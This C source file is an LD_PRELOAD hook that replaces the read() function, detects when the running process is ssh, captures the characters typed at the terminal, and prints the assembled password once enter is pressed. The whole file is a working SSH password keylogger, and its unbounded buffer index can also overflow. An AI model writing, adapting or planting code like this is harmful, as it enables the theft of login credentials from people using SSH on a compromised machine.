#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>

// This is baaaaad
// extern char *program_invocation_name;
// extern char *program_invocation_short_name;

int checkifssh(int fd){
  int pid = getpid();
  // printf("pid is : %d\n", pid);
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", pid);
  FILE *file = fopen(path, "r");
  char processName[64];
  fgets(processName, sizeof(processName), file);
  processName[strcspn(processName, "\n")] = 0;
  if (strcmp(processName, "ssh") == 0) {
    // printf("ITS SSH\n");
    return 1;
  }
  return 0;
  // printf("%s", processName);
}

ssize_t read(int fd, void *buf, size_t nbytes) {
  ssize_t (*r_read)(int fd, void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "read");
  ssize_t output = r_read(fd, buf, nbytes);
  static char passwd[64];
  static int pos = 0;
  // Print le pwd mais tout le temps pas que pour le ssh (-_-)
  
  int is_ssh = checkifssh(fd);
  if (isatty(fd) == 1 && is_ssh) {
    // tjrs sur [0] car keyboard lit key par key
    passwd[pos] = ((char *) buf)[0];
    if (((char*)buf)[0] == '\n') {
        // printf("Found the enter!\n");
        passwd[pos] = '\0';
        write(1, passwd, strlen(passwd));
    }
    
    pos++;
    }
    
  

  return output;
  }
